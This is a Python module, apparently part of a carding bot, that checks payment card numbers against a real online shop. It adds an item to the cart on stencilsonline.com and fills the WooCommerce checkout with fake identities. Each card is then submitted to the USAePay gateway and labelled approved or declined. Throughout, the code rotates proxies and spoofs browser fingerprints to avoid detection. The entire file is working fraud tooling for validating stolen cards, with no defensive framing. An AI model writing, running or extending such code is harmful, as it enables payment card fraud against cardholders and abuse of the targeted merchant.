# Pure gate motor for 'wu' — no Telegram-bot dependency.

import os, random, re

from faker import Faker

from urllib.parse import quote

import curl_cffi.requests as creq

_GATEWAY = 'WooCommerce USAePay CCN'

_f = Faker('en_US')

# El gate WU define su propio proxy regional leyendo php/proxies.txt (US).
# Si el archivo está vacío, cae al env WU_PROXY. Si tampoco, sin proxy.
# El pool puede tener formato 'user:pass@host:port' (sin esquema); curl_cffi
# también necesita 'http://user:pass@host:port'.
def _normalize_proxy(p: str) -> str:
    p = (p or '').strip()
    if not p:
        return ''
    if '://' not in p:
        return f'http://{p}'
    return p

try:
    from api.proxies import get_proxy as _gate_get_proxy
    _PROXY = _normalize_proxy(_gate_get_proxy('US') or os.getenv('WU_PROXY') or '')
except Exception:
    _PROXY = _normalize_proxy(os.getenv('WU_PROXY') or '')

_name = lambda: (_f.first_name().replace(' ', '').replace('.', ''), _f.last_name())

_email = lambda: f'{_f.user_name()}{random.randint(1000, 9999)}@gmail.com'

_phone = lambda: f'512678{random.randint(1111, 9999)}'

_street = lambda n: f'{n}+street+{random.randint(1111, 9999)}'

def _strip_tags(s):
    return re.sub('\\s+', ' ', re.sub('<[^>]+>', ' ', str(s))).strip()

def _found(html, start, end):
    try:
        s = html.index(start) + len(start)
        return html[s:html.index(end, s)]
    except ValueError:
        return None

def _flow(num, mes, ano, cvv):
    mes = mes.zfill(2)
    ano = ano[-2:] if len(ano) == 4 else ano
    last = ''
    for _ in range(3):
        try:
            sess = creq.Session(impersonate=random.choice(['chrome110', 'chrome107', 'safari17_0']))
            sess.proxies = {'https': _PROXY, 'http': _PROXY}
            fn, ln = _name()
            em, ph, st = (_email(), _phone(), _street(fn))
            hdrs = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36', 'Origin': 'https://www.stencilsonline.com', 'Referer': 'https://www.stencilsonline.com/acrylic-paints/alizarin-crimson-acrylic-paint/'}
            sess.post('https://www.stencilsonline.com/acrylic-paints/alizarin-crimson-acrylic-paint/', headers={**hdrs, 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data={'quantity': '1', 'add-to-cart': '253'}, timeout=20)
            r2 = sess.get('https://www.stencilsonline.com/checkout/', headers=hdrs, timeout=20)
            nonce = _found(r2.text, 'name="woocommerce-process-checkout-nonce" value="', '"')
            if not nonce:
                last = 'nonce not found'
                continue
            data = f'billing_first_name={fn}&billing_last_name={ln}&billing_company=&billing_country=US&billing_address_1={st}&billing_address_2=&billing_city=NY&billing_state=NY&billing_postcode=10080&billing_phone={ph}&billing_email={quote(em)}&shipping_method%5B0%5D=flat_rate%3A9&payment_method=usaepay&usaepay-card-number={num}&usaepay-card-expiry={mes}%2F{ano}&usaepay-card-cvc=0000&woocommerce-process-checkout-nonce={nonce}&_wp_http_referer=%2F%3Fwc-ajax%3Dupdate_order_review'
            r3 = sess.post('https://www.stencilsonline.com/?wc-ajax=checkout', headers={**hdrs, 'Accept': 'application/json, text/javascript, */*; q=0.01', 'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8'}, data=data, timeout=20)
            rj = r3.json()
            if rj.get('result') == 'success':
                return {'status': True, 'success': True, 'response': 'Approved ✅ | Order Successful'}
            msg = _found(r3.text, 'Gateway Error: <!-- Error: ', '"') or _found(r3.text, '<li>', '</li>') or rj.get('messages', '') or str(rj.get('result', r3.text[:100]))
            return {'status': True, 'success': False, 'response': f'Declined ❌ | {_strip_tags(msg)[:120]}'}
        except Exception as e:
            last = str(e)[:180]
    return {'status': False, 'raise': f'Retries exhausted: {last}'}

def _checker(cc, binData):
    try:
        return _flow(cc[0], cc[1], cc[2], cc[3])
    except Exception as e:
        return {'status': False, 'raise': str(e)[:200]}

def run_check(cc, bin_data, ctx=None):
    r = _checker(cc, bin_data)
    if not r.get('status'):
        return {'status': 'Error ⚠️', 'response': r.get('raise', 'Gate error')}
    return {'status': 'Approved ✅' if r.get('success') else 'Declined ❌', 'response': r.get('response', '')}